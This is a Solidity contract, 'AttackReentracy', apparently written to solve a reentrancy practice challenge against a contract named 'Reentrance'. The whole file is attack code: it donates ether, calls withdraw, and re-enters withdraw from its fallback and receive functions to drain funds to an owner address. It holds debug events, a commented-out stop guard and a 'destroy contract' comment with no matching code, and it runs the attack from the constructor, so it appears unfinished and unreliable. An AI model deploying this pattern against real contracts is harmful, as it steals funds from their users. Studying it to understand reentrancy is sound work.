// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrace.sol";

contract AttackReentracy {
    bool public w = false;
    address payable public  _reentracy;

    event Withdraw(uint amount);
    event Log(address addr);
    event Log2(bool _w);
    event Log3(bytes s);

    // 0x84841B92767187f235B67690Db1179f7E6307faC
    constructor( address payable reentracy, address payable owner) public payable {
        _reentracy = reentracy;
        // 1. 往目标合约捐款
        Reentrance(reentracy).donate{value: 0.001 ether}(address(this));
        emit Log(address(this));
        emit Log3("11");
        emit Withdraw(Reentrance(reentracy).balanceOf(address(this)));
        // 调用目标合约取款
        Reentrance(reentracy).withdraw(1000000000000000);
        emit Withdraw(Reentrance(reentracy).balanceOf(address(this)));
        emit Log3("22");
        // 销毁当前合约，给owner转账
        payable(owner).transfer(address(this).balance);
        emit Log3("33");
        // 1000000000000000
    }

    fallback() external payable {
        emit Log2(w);
        emit Log3("99");
        // 调用目标合约取款
        // if (w) {
        //     return;
        // }
        w = true;
        Reentrance(_reentracy).withdraw(1000000000000000);
    }

    receive() external payable {
        emit Log2(w);
        emit Log3("101111");
        // 调用目标合约取款
        // if (w) {
        //     return;
        // }
        w = true;
        Reentrance(_reentracy).withdraw(1000000000000000);
    }

}
